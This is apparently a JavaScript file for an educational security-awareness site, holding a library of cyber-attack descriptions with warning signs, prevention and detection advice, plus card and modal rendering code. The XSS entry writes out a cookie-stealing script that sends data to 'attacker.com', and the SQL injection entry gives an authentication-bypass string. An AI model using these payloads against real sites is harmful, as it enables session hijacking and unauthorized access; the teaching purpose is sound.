/* ==========================================================================
   PHISHSHIELD - CYBER ATTACKS LIBRARY ENGINE (attacks.js)
   15+ Cyber Attack Vectors, Search, Category Filters, Severity Indicators,
   Interactive Detail Modals with Flowcharts & Prevention Steps
   ========================================================================== */

const ATTACKS_DATA = [
  {
    id: "phishing",
    name: "Phishing & Spear Phishing",
    category: "Social Engineering",
    severity: "Critical",
    summary: "Social engineering technique leveraging deceptive emails or fake websites to steal sensitive credentials and private data.",
    whatIsIt: "Phishing is a fraudulent cyber attack where attacker impersonates a trusted entity (e.g., bank, IT support, cloud service) to trick victims into revealing sensitive information like login credentials, credit card details, or personal identity info.",
    howItWorks: "1. Attacker crafts deceptive emails/messages mimicking genuine companies.\n2. Sends email to targets with urgent call to action (e.g., 'Account Suspended').\n3. Victim clicks fake login link leading to spoofed website.\n4. Victim submits login details, which are logged directly to the attacker's server.",
    attackFlow: ["Attacker Reconnaissance", "Phishing Email Broadcast", "Victim Clicks Malicious Link", "Credential Harvest on Fake Page", "Unauthorized Account Access"],
    commonTargets: "Corporate employees, online banking users, cloud storage users, remote workers.",
    warningSigns: "Mismatched sender domain (e.g. support@paypa1-security.com), urgent/threatening tone, generic greetings ('Dear Customer'), unexpected attachments or hyper-links.",
    realWorldExample: "The 2020 Twitter Spear Phishing attack where attackers tricked employees into granting access to internal administrative tools via phone social engineering.",
    impact: "Account takeover, corporate network breach, identity theft, financial loss.",
    prevention: "Implement Multi-Factor Authentication (MFA), verify email sender domains, deploy SPF/DKIM/DMARC, conduct regular employee security awareness drills.",
    detection: "Inspect email headers, analyze link destinations using URL sandboxes, deploy email gateway filters.",
    riskLevel: 9.5
  },
  {
    id: "ransomware",
    name: "Ransomware",
    category: "Malware",
    severity: "Critical",
    summary: "Malicious software that encrypts a victim's files and system, demanding a crypto ransom payment for the decryption key.",
    whatIsIt: "Ransomware is a specialized form of malware designed to deny access to a computer system or data until a ransom is paid to the attacker (typically in cryptocurrency like Bitcoin).",
    howItWorks: "1. Infiltration via malicious phishing attachment, compromised RDP, or software vulnerability.\n2. Silent execution and lateral movement across corporate networks.\n3. Encryption of local files and backups using strong cryptographic algorithms (AES-256 / RSA-2048).\n4. Dropping a ransom note demanding payment for decryption keys.",
    attackFlow: ["Infiltration", "System Enumeration", "Backup Destruction", "Mass Encryption", "Ransom Note Displayed"],
    commonTargets: "Healthcare systems, government municipalities, enterprise businesses, educational institutions.",
    warningSigns: "Suspicious file extensions (.locked, .crypto), inaccessible files, sudden high CPU/disk activity, missing volume shadow copies.",
    realWorldExample: "The WannaCry Ransomware outbreak of 2017 which affected over 200,000 systems globally by exploiting the EternalBlue vulnerability.",
    impact: "Complete operational shutdown, massive data loss, extortion, severe reputational damage.",
    prevention: "Maintain immutable offline backups (3-2-1 backup strategy), patch software vulnerabilities promptly, isolate critical network segments.",
    detection: "Monitor file system changes for rapid mass rename/encryption operations, deploy Endpoint Detection and Response (EDR) agents.",
    riskLevel: 9.8
  },
  {
    id: "malware",
    name: "General Malware",
    category: "Malware",
    severity: "High",
    summary: "Umbrella term for malicious software designed to compromise, damage, or gain unauthorized access to computer systems.",
    whatIsIt: "Malware (Malicious Software) includes viruses, worms, trojans, ransomware, spyware, and adware engineered by cybercriminals to bypass security controls and exploit vulnerabilities.",
    howItWorks: "Malware infects devices through compromised downloads, malicious email attachments, unpatched vulnerabilities, or infected USB drives, subsequently executing malicious payloads.",
    attackFlow: ["Delivery", "Exploitation", "Installation", "Command & Control (C2)", "Actions on Objectives"],
    commonTargets: "Personal computers, mobile devices, IoT hardware, web servers.",
    warningSigns: "Unusual system slowdowns, pop-up ads, disabled security software, unauthorized background processes.",
    realWorldExample: "Stuxnet malware designed to target industrial control systems (ICS) in nuclear enrichment facilities.",
    impact: "Data theft, system instability, unauthorized hardware hijacking, espionage.",
    prevention: "Install reputable Endpoint Protection/Antivirus, avoid unverified software downloads, apply OS security updates.",
    detection: "File integrity monitoring, heuristic antivirus scanning, network signature analysis.",
    riskLevel: 8.5
  },
  {
    id: "sqli",
    name: "SQL Injection (SQLi)",
    category: "Web Attacks",
    severity: "Critical",
    summary: "Code injection attack that inserts malicious SQL queries into database input fields to bypass authentication and dump tables.",
    whatIsIt: "SQL Injection occurs when untrusted user input is directly concatenated into dynamic SQL queries without proper sanitization or parameterization, allowing attackers to execute raw database commands.",
    howItWorks: "Attacker enters SQL syntax (e.g. `' OR '1'='1`) into a login or search form. The backend executes `SELECT * FROM users WHERE user='' OR '1'='1' AND pass=''`, granting administrative access.",
    attackFlow: ["Input Field Discovery", "SQL Syntax Injection", "Database Error / Behavior Analysis", "Schema Enumeration", "Database Data Exfiltration"],
    commonTargets: "E-commerce databases, web portals, SQL-backed web applications.",
    warningSigns: "Database error messages in HTTP responses, abnormal database query spikes, unexpected administrative logins.",
    realWorldExample: "The Sony Pictures database breach where attackers dumped thousands of user credentials using SQL injection vulnerabilities.",
    impact: "Complete database compromise, unauthorized administrative login, data tampering/deletion.",
    prevention: "Always use Prepared Statements (Parameterized Queries), Object-Relational Mapping (ORM), input validation, and least-privilege DB accounts.",
    detection: "Deploy Web Application Firewalls (WAF), review web server & database access logs for SQL keywords (`UNION`, `SELECT`, `DROP`).",
    riskLevel: 9.6
  },
  {
    id: "xss",
    name: "Cross-Site Scripting (XSS)",
    category: "Web Attacks",
    severity: "High",
    summary: "Vulnerability allowing attackers to inject client-side scripts into web pages viewed by other users to steal session cookies.",
    whatIsIt: "XSS occurs when a web application includes untrusted user data in a web page without proper validation or encoding, causing the target user's web browser to execute arbitrary JavaScript.",
    howItWorks: "Attacker posts `<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>` into a comment box. When victim views the page, the script executes, sending session tokens to the attacker.",
    attackFlow: ["Payload Injection", "Web Page Storage / Reflection", "Victim Loads Page", "Script Execution in Browser Context", "Session Hijacking / DOM Manipulation"],
    commonTargets: "Social networks, forums, webmail clients, interactive web apps.",
    warningSigns: "Unexplained redirects, unexpected pop-ups, unauthorized account actions executed while browsing.",
    realWorldExample: "The Samy Worm on MySpace which infected over 1 million user profiles within 20 hours using stored XSS.",
    impact: "Session hijacking, credential theft, page defacement, malicious client-side redirects.",
    prevention: "Context-aware HTML/JS output encoding, Content Security Policy (CSP) headers, HTTPOnly cookie flags.",
    detection: "Scan source code with SAST tools, audit user input fields with DAST scanners, inspect browser DOM execution.",
    riskLevel: 8.8
  },
  {
    id: "ddos",
    name: "DDoS (Distributed Denial of Service)",
    category: "Network Attacks",
    severity: "High",
    summary: "Overwhelming a target server or network with flood traffic from multiple compromised devices (botnet) to render it offline.",
    whatIsIt: "A DDoS attack attempts to disrupt the normal traffic of a targeted server, service, or network by overwhelming the target or its surrounding infrastructure with a flood of Internet traffic.",
    howItWorks: "Attackers command thousands of compromised IoT devices or malware-infected machines (Botnet) to send SYN, UDP, or HTTP requests simultaneously to the target IP address.",
    attackFlow: ["Botnet Recruitment", "C2 Command Broadcast", "Volumetric Traffic Flood", "Bandwidth / CPU Exhaustion", "Service Outage"],
    commonTargets: "Financial institutions, gaming servers, e-commerce giants, cloud providers.",
    warningSigns: "Unusually slow network performance, sudden unexplainable surge in traffic from international IP ranges, 502/504 web server timeouts.",
    realWorldExample: "The 2016 Dyn Cyberattack where a massive DDoS powered by the Mirai Botnet brought down Twitter, Netflix, and Reddit across the US.",
    impact: "Business disruption, massive revenue loss, SLA breaches, infrastructure degradation.",
    prevention: "Utilize DDoS mitigation services (Cloudflare, AWS Shield), implement rate limiting, configure network load balancers.",
    detection: "Monitor network traffic flow (NetFlow), set up threshold anomaly alerts on incoming packet rates.",
    riskLevel: 8.9
  },
  {
    id: "mitm",
    name: "Man-in-the-Middle (MITM)",
    category: "Network Attacks",
    severity: "High",
    summary: "Attacker secretly intercepts and alters communications between two parties who believe they are directly communicating.",
    whatIsIt: "In a MITM attack, the attacker positions themselves between a victim and a legitimate service (like a banking portal), allowing them to eavesdrop on or manipulate session data.",
    howItWorks: "Executed through ARP spoofing, rogue Wi-Fi hotspots, or DNS poisoning. The attacker relays traffic between the victim and server while decrypting or inspecting data in transit.",
    attackFlow: ["Positioning on Network Segment", "Traffic Interception (ARP/DNS)", "SSL Stripping / Session Eavesdropping", "Data Manipulation", "Forwarding Payload"],
    commonTargets: "Users connected to public unencrypted Wi-Fi networks, IoT devices.",
    warningSigns: "SSL certificate warnings in browsers, unexplained drops in HTTPS encryption to HTTP, unexpected network latency.",
    realWorldExample: "DigiNotar CA Compromise where attackers issued fake SSL certificates to intercept Google account traffic across Iran.",
    impact: "Credential theft, sensitive data exposure, session hijacking, financial theft.",
    prevention: "Enforce HTTPS with HSTS headers, use encrypted VPNs on public networks, deploy static ARP tables or dynamic ARP inspection.",
    detection: "Audit SSL/TLS certificate chains, monitor network for unauthorized ARP broadcasts and duplicate MAC addresses.",
    riskLevel: 8.7
  },
  {
    id: "zeroday",
    name: "Zero-Day Attack",
    category: "Application Attacks",
    severity: "Critical",
    summary: "Attack that exploits a computer software vulnerability that is unknown to the vendor and has zero days of patch protection.",
    whatIsIt: "A Zero-Day vulnerability refers to a security flaw that is unknown to the software developer. A Zero-Day attack takes advantage of this flaw before developers can release a software security patch.",
    howItWorks: "Threat actors discover an unpatched flaw in operating systems, browsers, or firmware, develop an exploit binary, and launch covert targeted attacks prior to vendor awareness.",
    attackFlow: ["Vulnerability Discovery", "Exploit Development", "Covert Attack Launch", "Vendor Awareness", "Patch Development & Release"],
    commonTargets: "High-value enterprise targets, critical infrastructure, defense contractors, web browser vendors.",
    warningSigns: "Unusual system behavior without matched antivirus signatures, inexplicable memory corruption crashes.",
    realWorldExample: "The Log4Shell (CVE-2021-44228) zero-day flaw in Apache Log4j that allowed remote code execution across millions of enterprise applications.",
    impact: "Undetected system compromise, data exfiltration, persistent unauthorized access.",
    prevention: "Adopt Zero-Trust architecture, implement strict Application Whitelisting, utilize behavioral detection sandboxing.",
    detection: "Deploy Endpoint Detection and Response (EDR), monitor anomalous process creation and behavior.",
    riskLevel: 9.9
  },
  {
    id: "trojan",
    name: "Trojan Horse",
    category: "Malware",
    severity: "High",
    summary: "Malicious program disguised as legitimate or useful software to trick users into downloading and executing it.",
    whatIsIt: "A Trojan is a type of malware that conceals its true intent behind a benign appearance. Unlike worms, Trojans do not self-replicate; they rely on user tricks to gain installation.",
    howItWorks: "User downloads what looks like a free game, utility, or PDF reader. Upon installation, the Trojan secretly opens a backdoor port for remote attacker access.",
    attackFlow: ["Social Engineering Lure", "User Downloads File", "Legitimate App Execution + Background Payload", "Backdoor Channel Opened", "Remote Access Granted"],
    commonTargets: "General computer users, gamers, enterprise workstation users.",
    warningSigns: "New unknown startup entries, modified firewall configurations, unexpected network outbound traffic on high ports.",
    realWorldExample: "Emotet Banking Trojan originally designed as a banking Trojan, later evolving into a major malware distributor.",
    impact: "Remote system control, credential theft, keystroke logging, secondary malware installation.",
    prevention: "Only download software from official verified sources, verify file hashes (SHA-256), use application control policies.",
    detection: "Signature-based antivirus checks, monitoring active network sockets with `netstat` / Resource Monitor.",
    riskLevel: 8.4
  },
  {
    id: "botnet",
    name: "Botnet",
    category: "Network Attacks",
    severity: "High",
    summary: "Network of infected private computers or IoT devices controlled as a group by a Botmaster without owners' knowledge.",
    whatIsIt: "A botnet is a collection of internet-connected devices (PCs, routers, IP cameras) infected with malware that allows cybercriminals to control them remotely for mass attacks.",
    howItWorks: "Infected devices contact a Command and Control (C2) server. The Botmaster issues commands to launch massive DDoS floods, send spam emails, or mine cryptocurrencies.",
    attackFlow: ["Initial Device Infection", "C2 Beaconing", "Botnet Aggregation", "Command Execution", "Mass Attack Launch"],
    commonTargets: "Consumer IoT devices (routers, smart TVs, cameras), unpatched web servers.",
    warningSigns: "High internet data usage when idle, sluggish router performance, unexpected CPU usage fan noise.",
    realWorldExample: "Mirai Botnet which turned hundreds of thousands of weak default-password IoT devices into a massive DDoS weapon.",
    impact: "ISP bandwidth exhaustion, participation in illegal DDoS/spam operations without consent.",
    prevention: "Change default passwords on all smart devices, update router firmware, disable remote management protocols (Telnet/UPnP).",
    detection: "Monitor network outbound connections for C2 IP addresses, analyze DNS query logs for domain generation algorithms (DGA).",
    riskLevel: 8.6
  },
  {
    id: "csrf",
    name: "Cross-Site Request Forgery (CSRF)",
    category: "Web Attacks",
    severity: "Medium",
    summary: "Attack forcing an authenticated victim's web browser to execute unauthorized state-changing actions on a trusted web app.",
    whatIsIt: "CSRF tricks a logged-in victim into submitting a request to a web application in which they are currently authenticated (such as transferring money or changing an email address).",
    howItWorks: "Victim is logged into `bank.com`. Victim visits malicious `evil.com`, which automatically sends a hidden POST form request to `bank.com/transfer`. The browser attaches valid session cookies automatically.",
    attackFlow: ["Victim Logs Into Trusted Site", "Victim Visits Malicious Site", "Malicious Site Triggers Hidden HTTP Request", "Browser Transmits Active Cookies", "Server Executes Action"],
    commonTargets: "Web apps relying solely on HTTP cookies for authentication without anti-CSRF tokens.",
    warningSigns: "Unauthorized password resets, email address changes, or transactions performed while logged into services.",
    realWorldExample: "Netflix CSRF vulnerability in early versions that allowed attackers to add DVDs to victim's rental queues automatically.",
    impact: "Unauthorized state changes, account takeover, unauthorized financial transactions.",
    prevention: "Implement Anti-CSRF tokens (Synchronizer Token Pattern), set `SameSite=Strict` or `SameSite=Lax` on cookies, require re-authentication for sensitive actions.",
    detection: "Verify `Origin` and `Referer` request headers on server side.",
    riskLevel: 7.2
  },
  {
    id: "keylogger",
    name: "Keylogger",
    category: "Malware",
    severity: "High",
    summary: "Surveillance software or hardware device designed to record every keystroke typed by a user on their keyboard.",
    whatIsIt: "A keylogger is a tool that monitors and logs every key pressed on a keyboard without the user's consent, capturing passwords, credit card numbers, and confidential messages.",
    howItWorks: "Software keyloggers hook into OS API keyboard drivers or low-level keyboard events, saving keystrokes to encrypted log files and periodically uploading them to an attacker's server.",
    attackFlow: ["Installation via Malware/Physical Access", "Keyboard Hooking", "Keystroke Recording to Log File", "Exfiltration via SMTP/HTTP", "Attacker Password Extraction"],
    commonTargets: "Financial workstation users, gamers, enterprise administrators.",
    warningSigns: "Typing delay in web forms, unusual background service running, unexpected outbound HTTP/SMTP traffic.",
    realWorldExample: "Zeus Trojan which included advanced keylogging capabilities targeting online banking credentials.",
    impact: "Complete exposure of plaintext passwords, secret notes, messaging logs, and credit card numbers.",
    prevention: "Use Virtual Keyboards, Password Managers (autofill bypasses typing), Endpoint Protection software.",
    detection: "Inspect OS API hook monitoring, verify running background services, scan for hardware dongles plugged into USB ports.",
    riskLevel: 8.3
  },
  {
    id: "rootkit",
    name: "Rootkit",
    category: "Malware",
    severity: "Critical",
    summary: "Stealthy collection of malware designed to grant administrator-level access while actively hiding its presence from the OS.",
    whatIsIt: "A rootkit is a sophisticated software suite that grants threat actors persistent privileged (root/admin) access to a system while hiding files, network connections, and active processes from system diagnostic tools.",
    howItWorks: "Rootkits modify the OS kernel (Kernel-mode rootkit) or low-level system APIs (User-mode rootkit) so that when security tools ask 'show running processes', the rootkit filters itself out of the results.",
    attackFlow: ["Privilege Escalation Exploit", "Kernel Driver / API Hooking", "Hiding Files & Processes", "Persistent Backdoor Installation", "Unfiltered System Access"],
    commonTargets: "High-value servers, enterprise domain controllers, confidential workstations.",
    warningSigns: "Antivirus failing to run, operating system crashes (BSOD), discrepancies between file space used and file listings.",
    realWorldExample: "Sony BMG Copy Protection Rootkit (2005) which secretly installed rootkit software on PCs when playing Sony music CDs.",
    impact: "Total persistent system takeover, invisible cyber espionage, complete bypass of security controls.",
    prevention: "Enable UEFI Secure Boot, enforce Kernel Mode Code Signing, restrict administrative privileges.",
    detection: "Use specialized offline rootkit scanners (bootable USB), memory analysis with Volatility, signature checking.",
    riskLevel: 9.7
  },
  {
    id: "spyware",
    name: "Spyware",
    category: "Malware",
    severity: "Medium",
    summary: "Software that covertly gathers information about a person or organization and relays it to an external entity without authorization.",
    whatIsIt: "Spyware secretly monitors user behavior, browser history, microphone/camera feeds, and personal files, sending data back to advertisers or cybercriminals.",
    howItWorks: "Bundled into free utility downloads, fake browser extensions, or malicious email links. It runs silently in the background capturing telemetry.",
    attackFlow: ["Bundled Download", "Silent Background Install", "Telemetry & File Harvesting", "Exfiltration to External Server"],
    commonTargets: "Smartphone users, web browsers, consumer PCs.",
    warningSigns: "Homepage changes unexpectedly, browser search redirected to unknown search engines, high battery/bandwidth consumption.",
    realWorldExample: "Pegasus Spyware developed by NSO Group capable of zero-click infections on iOS and Android devices.",
    impact: "Privacy violation, data theft, location tracking, camera/microphone surveillance.",
    prevention: "Review app permissions strictly, audit browser extensions, avoid downloading unverified utility apps.",
    detection: "Scan system with anti-malware tools, audit privacy permission logs.",
    riskLevel: 7.8
  },
  {
    id: "worm",
    name: "Computer Worm",
    category: "Malware",
    severity: "High",
    summary: "Standalone malware program that replicates itself automatically across computer networks without human interaction.",
    whatIsIt: "Unlike viruses which require a host file or user action, a worm is a self-contained program that spreads independently over network protocols by exploiting software vulnerabilities.",
    howItWorks: "Worm scans network IP ranges for open ports with unpatched vulnerabilities, transmits an exploit payload, installs itself on the new host, and repeats the scanning process continuously.",
    attackFlow: ["Network Port Scan", "Vulnerability Exploitation", "Payload Transport", "Self-Execution on Remote Host", "Automated Propagation"],
    commonTargets: "Unpatched enterprise network hosts, connected IoT devices.",
    warningSigns: "Sudden spike in local network traffic, high volume of outbound connection attempts on port 445/135.",
    realWorldExample: "The ILOVEYOU Worm (2000) which infected millions of Windows PCs worldwide within hours via email attachment replication.",
    impact: "Network congestion, mass infection across enterprise infrastructure, file corruption.",
    prevention: "Disable unnecessary network services/ports, apply operating system security patches, implement network segmentation.",
    detection: "IDS/IPS signature alerts on worm propagation traffic, firewall packet inspection.",
    riskLevel: 8.9
  }
];

document.addEventListener('DOMContentLoaded', () => {
  if (document.getElementById('attacks-grid')) {
    initAttacksPage();
  }
});

function initAttacksPage() {
  const grid = document.getElementById('attacks-grid');
  const searchInput = document.getElementById('attack-search');
  const filterBtns = document.querySelectorAll('.filter-btn');

  let currentCategory = 'all';
  let currentSearch = '';

  function renderAttacks() {
    grid.innerHTML = '';

    const filtered = ATTACKS_DATA.filter(item => {
      const matchesCat = currentCategory === 'all' || item.category.toLowerCase().replace(/\s+/g, '-') === currentCategory;
      const matchesSearch = item.name.toLowerCase().includes(currentSearch) ||
                            item.summary.toLowerCase().includes(currentSearch) ||
                            item.category.toLowerCase().includes(currentSearch);
      return matchesCat && matchesSearch;
    });

    if (filtered.length === 0) {
      grid.innerHTML = `<div style="grid-column: 1/-1; text-align:center; padding:3rem; color:var(--text-muted);">
        <i class="fas fa-search" style="font-size:2rem; margin-bottom:1rem; display:block; color:var(--accent-cyan);"></i>
        No cyber attacks found matching your search query or filter.
      </div>`;
      return;
    }

    filtered.forEach(attack => {
      const card = document.createElement('div');
      card.className = 'glass-card attack-card';
      card.setAttribute('data-id', attack.id);
      
      let tagClass = 'tag-medium';
      if (attack.severity === 'Critical') tagClass = 'tag-critical';
      if (attack.severity === 'High') tagClass = 'tag-high';
      if (attack.severity === 'Low') tagClass = 'tag-low';

      card.innerHTML = `
        <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:1rem;">
          <span class="tag ${tagClass}">${attack.severity}</span>
          <span style="font-size:0.8rem; color:var(--text-muted); text-transform:uppercase; font-weight:600;">${attack.category}</span>
        </div>
        <h3 style="font-size:1.3rem; margin-bottom:0.75rem; color:var(--text-primary);">${attack.name}</h3>
        <p style="font-size:0.9rem; color:var(--text-secondary); margin-bottom:1.5rem; flex-grow:1;">${attack.summary}</p>
        <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid var(--border-color); padding-top:1rem;">
          <span style="font-size:0.8rem; font-family:var(--font-mono); color:var(--accent-cyan);">Risk Score: ${attack.riskLevel}/10</span>
          <button class="btn btn-outline btn-sm view-attack-btn">Analyze Attack <i class="fas fa-arrow-right"></i></button>
        </div>
      `;

      card.addEventListener('click', () => openAttackModal(attack));
      grid.appendChild(card);
    });
  }

  filterBtns.forEach(btn => {
    btn.addEventListener('click', () => {
      filterBtns.forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      currentCategory = btn.getAttribute('data-filter');
      renderAttacks();
    });
  });

  if (searchInput) {
    searchInput.addEventListener('input', (e) => {
      currentSearch = e.target.value.trim().toLowerCase();
      renderAttacks();
    });
  }

  renderAttacks();
}

/* --- ATTACK DETAIL MODAL RENDERER --- */
function openAttackModal(attack) {
  let modalOverlay = document.querySelector('.attack-modal-overlay');
  if (!modalOverlay) {
    modalOverlay = document.createElement('div');
    modalOverlay.className = 'modal-overlay attack-modal-overlay';
    modalOverlay.innerHTML = `
      <div class="modal-content">
        <button class="modal-close"><i class="fas fa-times"></i></button>
        <div class="attack-modal-body"></div>
      </div>
    `;
    document.body.appendChild(modalOverlay);
    modalOverlay.querySelector('.modal-close').addEventListener('click', () => {
      modalOverlay.classList.remove('active');
    });
    modalOverlay.addEventListener('click', (e) => {
      if (e.target === modalOverlay) modalOverlay.classList.remove('active');
    });
  }

  const body = modalOverlay.querySelector('.attack-modal-body');
  
  let tagClass = 'tag-medium';
  if (attack.severity === 'Critical') tagClass = 'tag-critical';
  if (attack.severity === 'High') tagClass = 'tag-high';

  body.innerHTML = `
    <div style="display:flex; align-items:center; gap:0.75rem; margin-bottom:0.75rem;">
      <span class="tag ${tagClass}">${attack.severity} Severity</span>
      <span style="color:var(--accent-purple); font-size:0.85rem; font-weight:600; text-transform:uppercase;">${attack.category}</span>
    </div>
    <h2 style="font-size:2rem; margin-bottom:1.5rem; color:var(--text-primary);">${attack.name}</h2>
    
    <div style="display:grid; grid-template-columns: 1fr; gap:1.5rem;">
      <div class="glass-card" style="padding:1.25rem;">
        <h4 style="color:var(--accent-cyan); margin-bottom:0.5rem;"><i class="fas fa-question-circle"></i> What is it?</h4>
        <p style="color:var(--text-secondary); font-size:0.95rem;">${attack.whatIsIt}</p>
      </div>

      <div class="glass-card" style="padding:1.25rem;">
        <h4 style="color:var(--accent-cyan); margin-bottom:0.5rem;"><i class="fas fa-cogs"></i> How It Works</h4>
        <p style="color:var(--text-secondary); font-size:0.95rem; white-space:pre-line;">${attack.howItWorks}</p>
      </div>

      <div class="glass-card" style="padding:1.25rem;">
        <h4 style="color:var(--accent-cyan); margin-bottom:0.75rem;"><i class="fas fa-project-diagram"></i> Attack Flowchart</h4>
        <div style="display:flex; flex-wrap:wrap; gap:0.5rem; align-items:center;">
          ${attack.attackFlow.map((step, idx) => `
            <span style="background:rgba(0,240,255,0.1); border:1px solid var(--border-cyan); padding:0.4rem 0.8rem; border-radius:var(--radius-sm); font-size:0.85rem; color:var(--text-primary);">
              ${idx+1}. ${step}
            </span>
            ${idx < attack.attackFlow.length - 1 ? '<i class="fas fa-chevron-right" style="color:var(--accent-purple); font-size:0.8rem;"></i>' : ''}
          `).join('')}
        </div>
      </div>

      <div style="display:grid; grid-template-columns: repeat(2, 1fr); gap:1rem;">
        <div class="glass-card" style="padding:1rem;">
          <h5 style="color:var(--warning); margin-bottom:0.3rem;"><i class="fas fa-crosshairs"></i> Common Targets</h5>
          <p style="font-size:0.88rem; color:var(--text-secondary);">${attack.commonTargets}</p>
        </div>
        <div class="glass-card" style="padding:1rem;">
          <h5 style="color:var(--danger); margin-bottom:0.3rem;"><i class="fas fa-exclamation-triangle"></i> Warning Signs</h5>
          <p style="font-size:0.88rem; color:var(--text-secondary);">${attack.warningSigns}</p>
        </div>
      </div>

      <div class="glass-card" style="padding:1.25rem; border-left:4px solid var(--accent-purple);">
        <h4 style="color:var(--accent-purple); margin-bottom:0.5rem;"><i class="fas fa-history"></i> Real-World Incident Case Study</h4>
        <p style="color:var(--text-secondary); font-size:0.95rem;">${attack.realWorldExample}</p>
      </div>

      <div style="display:grid; grid-template-columns: repeat(2, 1fr); gap:1rem;">
        <div class="glass-card" style="padding:1rem;">
          <h5 style="color:var(--success); margin-bottom:0.3rem;"><i class="fas fa-shield-alt"></i> Prevention</h5>
          <p style="font-size:0.88rem; color:var(--text-secondary);">${attack.prevention}</p>
        </div>
        <div class="glass-card" style="padding:1rem;">
          <h5 style="color:var(--accent-cyan); margin-bottom:0.3rem;"><i class="fas fa-search-location"></i> Detection</h5>
          <p style="font-size:0.88rem; color:var(--text-secondary);">${attack.detection}</p>
        </div>
      </div>
    </div>
  `;

  modalOverlay.classList.add('active');
}
